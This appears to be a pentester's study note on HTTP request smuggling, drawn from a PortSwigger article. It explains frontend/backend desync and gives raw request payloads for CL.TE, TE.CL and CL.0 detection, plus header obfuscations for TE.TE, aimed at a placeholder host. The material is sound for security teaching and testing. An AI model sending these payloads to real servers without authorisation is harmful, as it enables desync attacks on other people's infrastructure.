> From the PortSwigger very good article:\
> https://portswigger.net/web-security/request-smuggling/finding

## What is smuggling

To know when the body of POST request ends, servers can use **Content-Length** and **Transfer-Encoding** headers.

- **Content-Length** specifies the length of the message body in bytes
- **Transfer-Encoding (chunked)** indicates the chunk length in hexadecimal at the top of the body, and then stoppes and it meets a 0 in the body

:warning: **Smuggling requests may occur when frontend (proxy, firewall) and backend servers do not use the same delimiter method.**

:information_source: Use HTTP/1.1 to exploit, because HTTP/2 is not vulnerable.\
:information_source: However, it is still possible to exploit if the frontend supports HTTP/2 but not the backend!

## CL.TE vulnerabilities
- **Frontend** uses **Content-Length**
- **Backend** uses **Transfer-Encoding**

```
POST /robots.txt HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

The next request should answer with a 404.

## TE.CL vulnerabilities
- **Frontend** uses **Transfer-Encoding**
- **Backend** uses **Content-Length**

:information_source: Deactivate *Update Content-Length* in Burp

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

The next request should answer with a 404.

:information_source: The chunk size (here **5e**) is the length of the following chunk in hexadecimal (the chunk being the following request).

## TE.TE vulnerabilities
- Both use **Transfer-Encoding** but one of the servers can be induced not to process it by obfuscating the header in some way.

Ways to obfuscate the header:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## CL.0
- Front-end uses the **Content-Length** header and backend ignores it (treating it as having a value of 0 and treating the body as the next request).
- Transfer-Encoding header is useless as it is ignored by both frontend and backend servers.

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3

xyzGET / HTTP/1.1
Host: vulnerable-website.com
```

The next request should give a **405 Method Not Allowed** as the backend will process the body as the next request, so with **xyzGET** method. 
